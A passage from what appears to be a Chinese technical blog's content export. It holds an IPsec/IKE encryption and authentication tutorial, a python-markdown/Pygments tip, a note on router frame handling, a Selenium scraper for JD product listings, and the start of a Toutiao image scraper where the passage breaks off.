title="非对称加密"></a>非对称加密</h3><p>非对称加密算法使用一对秘钥进行加密和解密，这对秘钥成为公钥和私钥。用公钥加密的数据只能通过私钥解密，且无法通过一个秘钥推导出另外一个。非对称秘钥相对于对称秘钥来说更加安全。</p><p>举个例子：<br>接上列，小明有一天觉得秘钥不够安全了，向后移<strong>两位</strong>很容易就被敌人破解了，他想告诉小红变成向后移<strong>四位</strong>，但是两人相隔很远，该怎么办呢，他也不能通过电话去告诉小红，因为万一敌人截获了这个消息，他们之后的通信无疑和明文相同。这就体现了对称加密在某些情况下的不便，因为秘钥是万万不能泄露的。</p><p>如果要使用非对称加密的话，这个问题就比较容易解决了，小明只要把自己的公钥高速小红，让小红使用这个公钥来加密就行了。公钥可以让任何人指导，单是私钥只有小明有，加密过后的信息只能通过私钥解密。这样是不是就安全多了。</p><p>目前常见的非对称加密算法有：RSA，DSA，DH。前两种常用语验证功能，DH算法一般用于IPsec中的IKE协议。DH算法在IKE协商过程中比较重要，具体过程稍后再说。</p><h3 id="认证"><a href="#认证" class="headerlink" title="认证"></a>认证</h3><p>验证指IP通信的接收方确认数据发送方的真实身份以及数据在传输过程中是否遭篡改。前者称为数据源验证，后者称为数据完整性验证，IPSec通过这两种验证保证数据真实可靠。数据源验证和数据完整性验证这两种安全服务总是绑定在一起提供的。</p><p>虽然加密后的数据只能通过原始的加密密钥进行解密，但是<strong>无法验证解密后的信息是否是原始发送的信息</strong>。另外加密和解密的过程非常的消耗CPU，恶意用户可能会通过发送欺骗数据包，占用CPU资源。HMAC（Keyed-Hash Message Authentication Code）功能通过比较数字签名进行数据包完整性和真实性验证，这个过程消耗的CPU资源非常少，效率非常高。因此，IPSec采用HMAC功能进行验证。</p><p>在IPSec发送方，加密和验证通常配合使用。加密后的报文经HMAC生成数字签名，IP报文和数字签名同时发给对端；在IPSec接收方，通过比较数字签名进行数据完整性和真实性验证，验证不通过的报文直接丢弃，验证通过的报文再进行解密。加密和HMAC验证配合使用的过程如下图所示。</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/fig_dc_fd_ipsec_002701.png" alt="fig_dc_fd_ipsec_002701.png"></p><p>同加密一样，用于验证的对称密钥也可以手工配置，或者通过IKE协议自动协商生成。<br>常用的验证（HMAC）算法包括：MD5，SHA1，SHA2， SM3。</p><p>HMAC算法的原理如下：</p><ul><li>双方共享执行hash算法的秘钥key。</li><li>路由器A的用户数据与共享秘钥key通过hash算法得到数字签名。</li><li>路由器A将数字签名和用户数据一同传输给路由器B。</li><li>路由器B执行相同的算法过程得到数字签名。</li><li>路由器B比对数字签名是否一致</li></ul><blockquote><p>国密算法SM3（Senior Middle 3）是国家密码管理局编制的商用算法，用于密码应用中的数字签 名和验证、消息认证码的生成与验证以及随机数的生成，可满足多种密码应用的安全需求。</p></blockquote><h3 id="DH算法"><a href="#DH算法" class="headerlink" title="DH算法"></a>DH算法</h3><p>在IPsec中DH算法很重要，上面也提到了DH算法，它是一种非对称加密算法，DH算法全称为diffie-hellman。在IKE协议中当对等体接收到对端发送过来的公钥后，会用自己的秘钥（这里的私钥在IPsec中指的是我们配置的<strong>预共享密钥</strong>）和对方的公钥通过DH算法计算出一个共享秘钥。然后通过这个密钥加密数据。</p><p>但是要解密这个数据就必须知道对方的私钥，包括要使用对称加密算法解密对端发过来的数据时也需要知道对端的私钥。那么问题来了，如何在两个对等体之间安全的传递私钥呢？</p><p>其实，解决这个问题并不困难，可以通过非对称加密算法（如前面提到的DH算法）加密对称加密算法的秘钥，在用对称加密算法加密实际要传输的数据。如果公司需要一小时更换一次秘钥，只需让非对称加密算法一小时重新计算一次即可，而且<strong>由于非对称加密算法的私钥不会在网络上传输</strong>，其安全性也可得到保障。</p><blockquote><p>这是一个经典的解决私钥传递安全性的方法，使用非对称加密技术加密私钥，使用对称加密技术加密数据。这样既保证了加解密的高效性，也保证了私钥的安全性。</p></blockquote><h2 id="IKE的安全机制（重点）"><a href="#IKE的安全机制（重点）" class="headerlink" title="IKE的安全机制（重点）"></a>IKE的安全机制（重点）</h2><p>使用上面各个算法的特点，IKE具有一套自保护机制，可以在不安全的网络上安全地认证身份、分发密钥、建立IPsec SA：</p><h3 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h3><p>身份认证确认通信双方的身份（对等体的IP地址或名称），包括预共享密钥PSK（pre-shared key）认证、数字证书RSA（rsa-signature）认证和数字信封认证。</p><ul><li>在预共享密钥认证中，<strong>认证字</strong>作为一个输入来产生密钥，通信双方采用共享的密钥对报文进行Hash计算，判断双方的计算结果是否相同。如果相同，则认证通过；否则认证失败。</li><li>在数字证书认证中，通信双方使用CA证书进行数字证书合法性验证，双方各有自己的公钥（网络上传输）和私钥（自己持有）。发送方对原始报文进行Hash计算，并用自己的私钥对报文计   算结果进行加密，生成数字签名。接收方使用发送方的公钥对数字签名进行解密，并对报文进行Hash计算，判断计算结果与解密后的结果是否相同。如果相同，则认证通过；否则认证失     败。</li><li>在数字信封认证中，发送方首先随机产生一个对称密钥，使用接收方的公钥对此对称密钥进行加密（被公钥加密的对称密钥称为数字信封），发送方用对称密钥加密报文，同时用自己的私   钥生成数字签名。接收方用自己的私钥解密数字信封得到对称密钥，再用对称密钥解密报文，同时根据发送方的公钥对数字签名进行解密，验证发送方的数字签名是否正确。如果正确，则   认证通过；否则认证失败。</li></ul><p>对于预共享密钥认证方法，当有1个对等体对应多个对等体时，需要为每个对等体配置预共享的密钥。该方法在小型网络中容易建立，但安全性较低。使用数字证书安全性高，但需要CA来颁发数字证书，适合在大型网络中使用。而数字信封认证用于设备需要符合国家密码管理局要求时使用，此认证方法只能在IKEv1的主模式协商过程中支持。</p><p>IKE支持的认证算法有：MD5、SHA1、SHA2-256、SHA2-384、SHA2-512、AES-XCBC-MAC-96、SM3。</p><h3 id="身份保护"><a href="#身份保护" class="headerlink" title="身份保护"></a>身份保护</h3><p>身份数据在密钥产生之后加密传送，实现了对身份数据的保护。</p><p>IKE支持的加密算法有：DES、3DES、AES-128、AES-192、AES-256、SM1和SM4。</p><h2 id="IKE的两个建立阶段"><a href="#IKE的两个建立阶段" class="headerlink" title="IKE的两个建立阶段"></a>IKE的两个建立阶段</h2><p>IKE安全联盟是通过IKE协议协商建立的，IKE SA的建立时IPsec SA建立的基础。IKE第一阶段就是IKE SA的建立，IKE第二阶段时IPsec SA的建立。<br><em>IKE SA建立是为了保护IPsec SA建立所需要的数据，IPsec SA建立是为了保护用户数据。</em></p><h3 id="IKE协商第一阶段"><a href="#IKE协商第一阶段" class="headerlink" title="IKE协商第一阶段"></a>IKE协商第一阶段</h3><p>IKEv1协商阶段1的目的是建立IKE SA。IKE SA建立后对等体间的所有ISAKMP消息都将通过加密和验证，这条安全通道可以保证IKEv1第二阶段的协商能够安全进行。IKE SA是一个双向的逻辑连接，两个IPSec对等体间只建立一个IKE SA。</p><p>IKEv1协商阶段1支持两种协商模式：主模式（Main Mode）和野蛮模式（Aggressive Mode）</p><p>主模式需要用到6条ISAKMP消息，野蛮模式只需要3条ISAKMP消息。<br>与主模式相比，野蛮模式减少了交换信息的数目，提高了协商的速度，但是没有对身份信息进行加密保护。虽然野蛮模式<strong>不提供身份保护</strong>，但它可以满足某些特定的网络环境需求：</p><ul><li>如果发起方的IP地址不固定或者无法预知，而双方都希望<strong>采用预共享密钥验证</strong>方法来创建IKE SA，则只能采用野蛮模式。</li><li>如果发起方已知响应方的策略，或者对响应者的策略有全面的了解，采用野蛮模式能够更快地创建IKE SA。</li></ul><blockquote><p>为什么说野蛮模式不提供身份保护呢？ 请参考：<a href="https://blog.csdn.net/bytxl/article/details/38655493">https://blog.csdn.net/bytxl/article/details/38655493</a></p></blockquote><p>IKE第一阶段协商过程如下图所示：</p><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190302001332.png" alt="20190302001332.png"></p><p>在主模式中，这三个任务是通过六个数据报文完成的：前两个数据包用于协商对等体间的管理连接使用何种安全策略（交换ISAKMP/IKEc传输集）；中间的两个数据包通过DH算法产生并交换加密算法和HMAC功能所需的秘钥，最后两个数据包使用预共享秘钥等方式执行对等体间的身份验证。这里需要注意的是，前四个报文为明文传输，从第5个数据报文开始为密文传输，而前四个数据包通过各种算法最终产生的秘钥用于第5、地6个数据包及后续数据的加密。</p><h3 id="IKE协商第二阶段"><a href="#IKE协商第二阶段" class="headerlink" title="IKE协商第二阶段"></a>IKE协商第二阶段</h3><p><img src="https://raw.githubusercontent.com/handbye/images/master/20190302010856.png" alt="20190302010856.png"></p><p>ISAKMP/IKE阶段2主要是在两个ipsec对等体间建立数据连接，其主要完成以下任务。</p><ol><li>定义对等体间需要保护何种流量。</li><li>定义用来保护数据的安全协议。</li></ol><p>IKEv1协商阶段2的目的就是建立用来安全传输数据的IPSec SA，并为数据传输衍生出密钥。这一阶段采用快速模式（Quick Mode）。该模式使用IKEv1协商阶段1中生成的密钥对ISAKMP消息的完整性和身份进行验证，并对ISAKMP消息进行加密，故保证了交换的安全性。</p><p>IKEv1协商阶段2通过三条ISAKMP消息完成双方IPSec SA的建立：</p><ul><li><p>协商发起方发送本端的安全参数和身份认证信息。<br>安全参数包括被保护的数据流和IPSec安全提议等需要协商的参数。身份认证信息包括第一阶段计算出的密钥和第二阶段产生的密钥材料等，可以再次认证对等体。</p></li><li><p>协商响应方发送确认的安全参数和身份认证信息并生成新的密钥。<br>IPSec SA数据传输需要的加密、验证密钥由第一阶段产生的密钥、SPI、协议等参数衍生得出，以保证每个IPSec SA都有自己独一无二的密钥。<br>如果启用PFS，则需要再次应用DH算法计算出一个共享密钥，然后参与上述计算，因此在参数协商时要为PFS协商DH密钥组。</p></li><li><p>发送方发送确认信息，确认与响应方可以通信，协商结束。</p></li></ul><p>这里所提到的是IKE V1版本，IKE还有V2版本，采用IKEv2协商安全联盟比IKEv1协商过程要简化的多。要建立一对IPSec SA，IKEv1需要经历两个阶段：“主模式＋快速模式”或者“野蛮模式＋快速模式”，前者至少需要交换9条消息，后者也至少需要6条消息。而IKEv2正常情况使用2次交换共4条消息就可以完成一对IPSec SA的建立，如果要求建立的IPSec SA大于一对时，每一对IPSec SA只需额外增加1次创建子SA交换，也就是2条消息就可以完成。<br>详细关于IKE V2的知识请自行研究。</p><h2 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h2><ul><li>华为产品文档</li><li><a href="https://blog.csdn.net/bytxl/article/details/38655493">https://blog.csdn.net/bytxl/article/details/38655493</a></li><li><a href="https://blog.51cto.com/yangshufan/2103655">https://blog.51cto.com/yangshufan/2103655</a></li><li><a href="https://blog.csdn.net/y_xianjun/article/details/81327943">https://blog.csdn.net/y_xianjun/article/details/81327943</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> IPSEC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ipsec </tag>
            
            <tag> ike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用python markdown和Pygments进行代码高亮</title>
      <link href="2019/01/11/use-python-markdown-and-Pygments/"/>
      <url>2019/01/11/use-python-markdown-and-Pygments/</url>
      
        <content type="html"><![CDATA[<p>在学习django的时候，需要用到markdown编辑器，当使用编辑器写出来文章后需要在前端渲染出来，这时候就需要用到python-markdown这个库了。</p><h2 id="python-markdown"><a href="#python-markdown" class="headerlink" title="python-markdown"></a>python-markdown</h2><ul><li>安装</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">pip install markdown<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> markdownhtml <span class="token operator">=</span> markdown<span class="token punctuation">.</span>markdown<span class="token punctuation">(</span>your_text_string<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>扩展<br>当要用到一些markdown的扩展时，需要进行如下配置：</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">markdown<span class="token punctuation">.</span>markdown<span class="token punctuation">(</span>your_text_string<span class="token punctuation">,</span>extensions<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'markdown.extensions.extra'</span><span class="token punctuation">,</span>                                              <span class="token string">'markdown.extensions.codehilite'</span><span class="token punctuation">,</span>                                              <span class="token string">'markdown.extensions.tables'</span><span class="token punctuation">,</span>                                              <span class="token string">'markdown.extensions.toc'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>但是启用扩展后代码依旧无法高亮，那是因为我们没有给前端页面应用相应的css样式， python-markdown是不带代码高亮样式的。</p><h2 id="Pygments"><a href="#Pygments" class="headerlink" title="Pygments"></a>Pygments</h2><p>pygments是一款可以自动生成代码高亮css的工具。</p><ul><li>安装</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">pip install pygments<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用<br>pygmentize -S native -f html &gt; pygments.css</li></ul><p>其中<strong>native</strong>为代码高亮样式名称</p><p>可以使用的代码高亮样式可以去官网查看：<br><a href="http://pygments.org/demo">http://pygments.org/demo</a></p><p>最后将生成好的css文件放入项目所在文件夹，然后在对应的前端页面引入即可。</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> django </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pygments </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>路由器收到一个数据帧后的处理过程</title>
      <link href="2018/12/13/how-router-frame-forward/"/>
      <url>2018/12/13/how-router-frame-forward/</url>
      
        <content type="html"><![CDATA[<p>路由器是一个三层设备，当它收到一个数据帧时是如何处理的呢？</p><p>数据帧有三种：</p><ul><li>单播帧</li><li>广播帧（路由器是隔离广播域的，所以路由器只会处理ARP广播报文）</li><li>组播帧</li></ul><h2 id="路由器对以上三种帧的处理情况如下："><a href="#路由器对以上三种帧的处理情况如下：" class="headerlink" title="路由器对以上三种帧的处理情况如下："></a>路由器对以上三种帧的处理情况如下：</h2><ul><li><p>若收到一个二层单播帧，对于路由器来讲，是一个三层设备，当然兼具二层的功能，所以当收到一个单播帧的时候，要判断这个帧的目的mac地址是不是接口的mac地址，如果是，解封装去看三层的ip地址，再看三层目的ip地址是不是接口的ip地址，如果是，交给接口处理，如果不是，去查找路由表，去重新去做一个二层帧的封装，继续往下查找。如果目的mac不是接口的mac地址，直接丢掉。</p></li><li><p>若收到一个二层广播帧，那么是arp广播，它就会解封装，看arp信息里请求的ip地址是谁，如果说请求里的是路由器所在接口的IP地址，一定会去响应；如果说请求的IP地址不是路由器接口的IP地址，同时路由器没有开启ARP代理，一定会丢弃，如果ARP请求的不是路由器接口的，是后面的网段，并且开启了ARP代理，路由器去判断有没有去往目标网段的路由，如果有，就去做代理。</p></li><li><p>若收到一个二层组播帧，要看路由器的接口有没有加入这个组，缺省情况下，路由器接口加入了224.0.0.1 ，224.0.0.2 。<br>（使能了组播功能就加入了），如果路由器接口没有加入到这个组播组，那么丢弃。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 路由交换 </category>
          
          <category> 链路层 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 帧处理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用selenium爬取京东商品信息</title>
      <link href="2018/12/06/selenium-jd-product-info/"/>
      <url>2018/12/06/selenium-jd-product-info/</url>
      
        <content type="html"><![CDATA[<h1 id="使用selenium爬取京东商品信息，包括商品名称，价格，店铺，商品图片，评价数"><a href="#使用selenium爬取京东商品信息，包括商品名称，价格，店铺，商品图片，评价数" class="headerlink" title="使用selenium爬取京东商品信息，包括商品名称，价格，店铺，商品图片，评价数"></a>使用selenium爬取京东商品信息，包括商品名称，价格，店铺，商品图片，评价数</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> selenium <span class="token keyword">import</span> webdriver<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>by <span class="token keyword">import</span> By<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support<span class="token punctuation">.</span>ui <span class="token keyword">import</span> WebDriverWait<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>common<span class="token punctuation">.</span>keys <span class="token keyword">import</span> Keys<span class="token keyword">from</span> selenium<span class="token punctuation">.</span>webdriver<span class="token punctuation">.</span>support <span class="token keyword">import</span> expected_conditions <span class="token keyword">as</span> EC<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> re<span class="token comment"># driver = webdriver.Chrome()</span>driver <span class="token operator">=</span> webdriver<span class="token punctuation">.</span>PhantomJS<span class="token punctuation">(</span><span class="token punctuation">)</span>wait <span class="token operator">=</span> WebDriverWait<span class="token punctuation">(</span>driver<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span>driver<span class="token punctuation">.</span>set_window_size<span class="token punctuation">(</span><span class="token number">1400</span><span class="token punctuation">,</span> <span class="token number">900</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        driver<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"https://www.jd.com"</span><span class="token punctuation">)</span>        <span class="token builtin">input</span> <span class="token operator">=</span> wait<span class="token punctuation">.</span>until<span class="token punctuation">(</span>EC<span class="token punctuation">.</span>presence_of_element_located<span class="token punctuation">(</span><span class="token punctuation">(</span>By<span class="token punctuation">.</span>CSS_SELECTOR<span class="token punctuation">,</span> <span class="token string">"#key"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        submit <span class="token operator">=</span> wait<span class="token punctuation">.</span>until<span class="token punctuation">(</span>EC<span class="token punctuation">.</span>element_to_be_clickable<span class="token punctuation">(</span><span class="token punctuation">(</span>By<span class="token punctuation">.</span>CSS_SELECTOR<span class="token punctuation">,</span> <span class="token string">"#search > div > div.form > button > i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token builtin">input</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>key<span class="token punctuation">)</span>        submit<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> TimeoutError<span class="token punctuation">:</span>        <span class="token keyword">return</span> search<span class="token keyword">def</span> <span class="token function">get_product</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正在搜索"</span><span class="token punctuation">)</span>    wait<span class="token punctuation">.</span>until<span class="token punctuation">(</span>EC<span class="token punctuation">.</span>presence_of_element_located<span class="token punctuation">(</span><span class="token punctuation">(</span>By<span class="token punctuation">.</span>CSS_SELECTOR<span class="token punctuation">,</span> <span class="token string">"#J_goodsList > ul > li:nth-child(1) > div > div.p-name.p-name-type-2 > a > em"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    html <span class="token operator">=</span> driver<span class="token punctuation">.</span>page_source    soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span> <span class="token string">'lxml'</span><span class="token punctuation">)</span>    items <span class="token operator">=</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">"gl-i-wrap"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> items<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            titles <span class="token operator">=</span> i<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">"p-name p-name-type-2"</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> y <span class="token keyword">in</span> titles<span class="token punctuation">:</span>                title <span class="token operator">=</span> y<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"em"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span>            links <span class="token operator">=</span> i<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">"p-img"</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> y <span class="token keyword">in</span> links<span class="token punctuation">:</span>                link<span class="token operator">=</span>y<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>                link <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>link<span class="token punctuation">)</span>                product__img_link<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r"//[^\s]*[jpg]"</span><span class="token punctuation">,</span>link<span class="token punctuation">)</span>                img_link<span class="token operator">=</span><span class="token string">'http:'</span><span class="token operator">+</span> product__img_link<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>            prices <span class="token operator">=</span> i<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">'p-price'</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> y <span class="token keyword">in</span> prices<span class="token punctuation">:</span>                symbol <span class="token operator">=</span> y<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"em"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span>                price <span class="token operator">=</span> y<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span>                price<span class="token operator">=</span>symbol<span class="token operator">+</span>price            shops <span class="token operator">=</span> i<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">'p-shop'</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> y <span class="token keyword">in</span> shops<span class="token punctuation">:</span>                shop <span class="token operator">=</span> y<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"span"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span>            comments <span class="token operator">=</span> i<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">,</span>class_<span class="token operator">=</span><span class="token string">'p-commit'</span><span class="token punctuation">)</span>            <span class="token keyword">for</span> y <span class="token keyword">in</span> comments<span class="token punctuation">:</span>                comment <span class="token operator">=</span> y<span class="token punctuation">.</span>find<span class="token punctuation">(</span><span class="token string">"strong"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get_text<span class="token punctuation">(</span><span class="token punctuation">)</span>            product<span class="token operator">=</span><span class="token punctuation">&#123;</span>                <span class="token string">"商品名称"</span><span class="token punctuation">:</span>title<span class="token punctuation">,</span>                <span class="token string">"商品店铺"</span><span class="token punctuation">:</span>shop<span class="token punctuation">,</span>                <span class="token string">"商品价格"</span><span class="token punctuation">:</span>price<span class="token punctuation">,</span>                <span class="token string">"商品图片"</span><span class="token punctuation">:</span>img_link<span class="token punctuation">,</span>                <span class="token string">"商品评价数"</span><span class="token punctuation">:</span>comment            <span class="token punctuation">&#125;</span>            <span class="token comment"># return product</span>            write_data<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>product<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token operator">+</span><span class="token string">"-"</span><span class="token operator">*</span><span class="token number">100</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>            <span class="token comment"># print(product)</span>        <span class="token keyword">except</span> AttributeError<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"**抓取异常**"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_next_page</span><span class="token punctuation">(</span>page_num<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正在翻页"</span><span class="token punctuation">,</span>page_num<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token builtin">input</span> <span class="token operator">=</span> wait<span class="token punctuation">.</span>until<span class="token punctuation">(</span>EC<span class="token punctuation">.</span>presence_of_element_located<span class="token punctuation">(</span><span class="token punctuation">(</span>By<span class="token punctuation">.</span>CSS_SELECTOR<span class="token punctuation">,</span> <span class="token string">"#J_bottomPage > span.p-skip > input"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token builtin">input</span><span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token builtin">input</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>page_num<span class="token punctuation">)</span>        driver<span class="token punctuation">.</span>find_element_by_css_selector<span class="token punctuation">(</span><span class="token string">"#J_bottomPage > span.p-skip > a"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>send_keys<span class="token punctuation">(</span>Keys<span class="token punctuation">.</span>ENTER<span class="token punctuation">)</span> <span class="token comment">#点击确定按钮出错，只好用回车输入代替</span>        driver<span class="token punctuation">.</span>refresh<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">#这个是必须的，否则会报奇怪的错误</span>        get_product<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> TimeoutError<span class="token punctuation">:</span>        get_next_page<span class="token punctuation">(</span>page_num<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">write_data</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>    f <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"京东商品.txt"</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span>    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>result<span class="token punctuation">)</span>    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        search<span class="token punctuation">(</span><span class="token string">'电脑'</span><span class="token punctuation">)</span>        get_product<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">101</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#这里其实可以用代码获取页数</span>            get_next_page<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>        <span class="token keyword">pass</span>    <span class="token keyword">finally</span><span class="token punctuation">:</span>        driver<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 爬虫 </tag>
            
            <tag> selenium </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python抓取头条街拍图片</title>
      <link href="2018/12/02/python-toutiao-pic/"/>
      <url>2018/12/02/python-toutiao-pic/</url>
      
        <content type="html"><![CDATA[<h1 id="爬取头条街拍图片"><a href="#爬取头条街拍图片" class="headerlink" title="爬取头条街拍图片"></a>爬取头条街拍图片</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#抓取头条街拍图片</span><span class="token comment">#抓取地址：https://www.toutiao.com/search/?keyword=%E8%A1%97%E6%8B%8D</span><span class="token keyword">import</span> requests<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse<span class="token keyword">from</span> requests<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ConnectionError<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup<span class="token keyword">import</span> re<span class="token keyword">import</span> json<span class="token keyword">import</span> os<span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5proxies<span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token string">"http"</span><span class="token punctuation">:</span><span class="token 